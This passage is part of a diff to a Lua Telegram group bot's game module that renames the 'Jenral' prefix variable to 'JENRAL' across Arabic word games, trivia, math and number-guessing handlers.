-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ ترتيب للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == DevALI:get(JENRAL..'ALI:GameNum'..msg.chat_id_) and not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ ترتيب للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end
 if text == 'محيبس' and SourceCh(msg) or text == 'بات' and SourceCh(msg) or text == 'المحيبس' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 Num = math.random(1,6)
-DevALI:set(Jenral.."GAMES"..msg.chat_id_,Num) 
+DevALI:set(JENRAL.."GAMES"..msg.chat_id_,Num) 
 TEST = [[
 ➀     ➁     ➂     ➃     ➄     ➅
 ↓     ↓     ↓     ↓     ↓     ↓
@@ -3543,15 +3543,15 @@ TEST = [[
 ⌁︙الفائز يحصل على (5) نقاط
 ]]
 Dev_ALI(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
-DevALI:setex(Jenral.."SET:GAME"..msg.chat_id_, 100, true)  
+DevALI:setex(JENRAL.."SET:GAME"..msg.chat_id_, 100, true)  
 return false  
 end end
 if text == 'حزوره' and SourceCh(msg) or text == 'الحزوره' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
 name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
 name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
@@ -3585,24 +3585,24 @@ name = string.gsub(name,'الثلج','انا ابن الماء فان تركون
 name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
 name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
 name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
-JenralTEAM = '⌁︙اول واحد يحلها يربح ↫ '..name
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙اول واحد يحلها يربح ↫ '..name
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum'..msg.chat_id_) and not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ حزوره للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == DevALI:get(JENRAL..'ALI:GameNum'..msg.chat_id_) and not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ حزوره للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end 
 if text == 'المعاني' and SourceCh(msg) or text == 'معاني' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum2'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum2'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'قرد','🐒')
 name = string.gsub(name,'دجاجه','🐔')
 name = string.gsub(name,'بطريق','🐧')
@@ -3628,24 +3628,24 @@ name = string.gsub(name,'زرافه','🦒')
 name = string.gsub(name,'قنفذ','🦔')
 name = string.gsub(name,'تفاحه','🍎')
 name = string.gsub(name,'باذنجان','🍆')
-JenralTEAM = '⌁︙ما معنى هذا السمايل :؟ ↫ '..name
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙ما معنى هذا السمايل :؟ ↫ '..name
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum2'..msg.chat_id_) and not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المعاني للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == DevALI:get(JENRAL..'ALI:GameNum2'..msg.chat_id_) and not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المعاني للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end 
 if text == 'العكس' and SourceCh(msg) or text == 'عكس' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum3'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum3'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'باي','هلو')
 name = string.gsub(name,'فهمت','مافهمت')
 name = string.gsub(name,'موزين','زين')
@@ -3671,24 +3671,24 @@ name = string.gsub(name,'موعطشان','عطشان')
 name = string.gsub(name,'خوش ولد','موخوش ولد')
 name = string.gsub(name,'اني','مطي')
 name = string.gsub(name,'هادئ','عصبي')
-JenralTEAM = '⌁︙ما هو عكس كلمة ↫ '..name
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙ما هو عكس كلمة ↫ '..name
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum3'..msg.chat_id_) and not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ العكس للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == DevALI:get(JENRAL..'ALI:GameNum3'..msg.chat_id_) and not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ العكس للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end 
 if text == 'المختلف' and SourceCh(msg) or text == 'مختلف' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum4'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum4'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
 name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
 name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
@@ -3717,26 +3717,26 @@ name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
 name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
 name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
 name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
-JenralTEAM = '⌁︙اول واحد يطلع المختلف يربح\n{'..name..'} '
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙اول واحد يطلع المختلف يربح\n{'..name..'} '
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum4'..msg.chat_id_) and not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المختلف للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == DevALI:get(JENRAL..'ALI:GameNum4'..msg.chat_id_) and not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المختلف للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end  
 if text == 'امثله' and SourceCh(msg) or text == 'الامثله' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {
 'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
 };
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum5'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum5'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
 name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
 name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
@@ -3757,25 +3757,25 @@ name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
 name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
 name = string.gsub(name,'القرد',' ___ بعين امه غزال')
 name = string.gsub(name,'يكحله','اجه ___ عماها')
-JenralTEAM = '⌁︙اكمل المثال التالي ↫ ['..name..']'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙اكمل المثال التالي ↫ ['..name..']'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum5'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
-DevALI:del(Jenral..'ALI:GameNum5'..msg.chat_id_)
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ امثله للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+if text == DevALI:get(JENRAL..'ALI:GameNum5'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevALI:del(JENRAL..'ALI:GameNum5'..msg.chat_id_)
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ امثله للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end  
 if text == 'رياضيات' and SourceCh(msg) or text == 'الرياضيات' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum6'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum6'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'9','7 + 2 = ?')
 name = string.gsub(name,'46','41 + 5 = ?')
 name = string.gsub(name,'2','5 - 3 = ?')
@@ -3789,25 +3789,25 @@ name = string.gsub(name,'15','25 - 10 = ?')
 name = string.gsub(name,'39','44 - 5 = ?')
 name = string.gsub(name,'5','12 + 1 - 8 = ?')
 name = string.gsub(name,'16','16 + 16 - 16 = ?')
-JenralTEAM = '⌁︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum6'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
-DevALI:del(Jenral..'ALI:GameNum6'..msg.chat_id_)
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ رياضيات للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+if text == DevALI:get(JENRAL..'ALI:GameNum6'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevALI:del(JENRAL..'ALI:GameNum6'..msg.chat_id_)
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ رياضيات للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end  
 if text == 'الانكليزي' and SourceCh(msg) or text == 'الانجليزيه' and SourceCh(msg) or text == 'انكليزيه' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum7'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum7'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'ذئب','Wolf')
 name = string.gsub(name,'معلومات','Information')
 name = string.gsub(name,'قنوات','Channels')
@@ -3820,26 +3820,26 @@ name = string.gsub(name,'تمساح','crocodile')
 name = string.gsub(name,'شاطئ','Beach')
 name = string.gsub(name,'غبي','Stupid')
 name = string.gsub(name,'صداقه','Friendchip')
-JenralTEAM = '⌁︙ما معنى كلمة ↫ '..name
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙ما معنى كلمة ↫ '..name
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum7'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
-DevALI:del(Jenral..'ALI:GameNum7'..msg.chat_id_)
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ انكليزيه للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+if text == DevALI:get(JENRAL..'ALI:GameNum7'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevALI:del(JENRAL..'ALI:GameNum7'..msg.chat_id_)
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ انكليزيه للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end  
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'اسئله' and SourceCh(msg) or text == 'اختيارات' and SourceCh(msg) or text == 'الاسئله' and SourceCh(msg) or text == 'اساله' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum8'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum8'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'النيل','⌁︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
 name = string.gsub(name,'14','⌁︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
 name = string.gsub(name,'الفم','⌁︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
@@ -3870,42 +3870,42 @@ name = string.gsub(name,'لندن','⌁︙ماهي عاصمه انجلترا ؟\
 name = string.gsub(name,'الانسان','⌁︙ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
 name = string.gsub(name,'طوكيو','⌁︙ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
 name = string.gsub(name,'خديجه','⌁︙من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
-JenralTEAM = name..'\n⌁︙ارسل الجواب الصحيح فقط'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = name..'\n⌁︙ارسل الجواب الصحيح فقط'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum8'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
-DevALI:del(Jenral..'ALI:GameNum8'..msg.chat_id_)
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ الاسئله للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+if text == DevALI:get(JENRAL..'ALI:GameNum8'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevALI:del(JENRAL..'ALI:GameNum8'..msg.chat_id_)
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ الاسئله للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end  
---     Source Jenral     --
-if DevALI:get(Jenral.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
+--     Source JENRAL     --
+if DevALI:get(JENRAL.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 20 then
 Dev_ALI(msg.chat_id_, msg.id_, 1,"⌁︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
 return false  end 
-local GETNUM = DevALI:get(Jenral.."GAMES:NUM"..msg.chat_id_)
+local GETNUM = DevALI:get(JENRAL.."GAMES:NUM"..msg.chat_id_)
 if tonumber(NUM) == tonumber(GETNUM) then
-DevALI:del(Jenral..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
-DevALI:del(Jenral.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
+DevALI:del(JENRAL..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
+DevALI:del(JENRAL.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-DevALI:incrby(Jenral..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
-if tonumber(DevALI:get(Jenral..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
-DevALI:del(Jenral..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
-DevALI:del(Jenral.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
+DevALI:incrby(JENRAL..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
+if tonumber(DevALI:get(JENRAL..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
+DevALI:del(JENRAL..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
+DevALI:del(JENRAL.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
 else
-if tonumber(DevALI:get(Jenral..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
+if tonumber(DevALI:get(JENRAL..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
 SetNum = 'محاولتان فقط'
-elseif tonumber(DevALI:get(Jenral..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
+elseif tonumber(DevALI:get(JENRAL..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
 SetNum = 'محاوله واحده فقط'
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
@@ -3914,37 +3914,37 @@ end
 end
 end
 if text == 'خمن' and SourceCh(msg) or text == 'تخمين' and SourceCh(msg) then   
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 Num = math.random(1,20)
-DevALI:set(Jenral.."GAMES:NUM"..msg.chat_id_,Num) 
+DevALI:set(JENRAL.."GAMES:NUM"..msg.chat_id_,Num) 
